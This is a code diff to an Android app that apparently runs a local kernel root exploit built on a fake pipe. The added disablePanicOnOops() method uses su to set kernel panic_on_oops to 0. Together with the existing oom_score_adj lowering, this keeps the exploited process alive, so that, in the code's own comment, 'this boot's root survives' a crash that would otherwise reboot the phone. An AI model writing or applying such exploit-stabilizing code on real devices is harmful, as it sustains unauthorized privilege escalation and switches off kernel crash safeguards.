@@ -666,10 +666,12 @@ public class MainActivity extends Activity implements PayloadStore.Log {
     }
 
     /**
-     * Root can exempt the parked process from LMKD. It does not make the
-     * process immortal: SIGKILL from root/shell and reboot still end it.
+     * Root can exempt the parked process from LMKD and turn the panic on a
+     * killed run into a dead task. It does not make the process immortal:
+     * root/shell SIGKILL still ends it and reboot still cleans it.
      */
     private void hardenParkedProcess() {
+        disablePanicOnOops();
         String pid = readPidOrNull();
         if ((pid == null || pid.isEmpty()) && exploitPid != null
                 && exploitPid.matches("\\d+")) {
@@ -687,6 +689,27 @@ public class MainActivity extends Activity implements PayloadStore.Log {
                 + " -> " + after + "\n");
         if (!"-1000".equals(after)) {
             appendLog("[!] oom_score_adj not lowered; avoid memory pressure while parked\n");
+        }
+    }
+
+    /**
+     * A parked run that is killed oopses in free_pipe_info() while the kernel
+     * tears down the fake pipe, and panic_on_oops turns that into a reboot.
+     * Clearing the sysctl makes the kernel park the exiting task as
+     * TASK_DEAD (shown as state X) instead, so the phone stays up and this
+     * boot's root survives. Global and per-boot: a reboot restores the
+     * built-in value of 1.
+     */
+    private void disablePanicOnOops() {
+        String before = captureShell(
+                "su -c " + quote("cat /proc/sys/kernel/panic_on_oops"), 15000L).trim();
+        captureShell("su -c " + quote("echo 0 > /proc/sys/kernel/panic_on_oops"),
+                15000L);
+        String after = captureShell(
+                "su -c " + quote("cat /proc/sys/kernel/panic_on_oops"), 15000L).trim();
+        appendLog("[i] panic_on_oops " + before + " -> " + after + "\n");
+        if (!"0".equals(after)) {
+            appendLog("[!] panic_on_oops is not 0; killing the parked run will reboot\n");
         }
     }
 
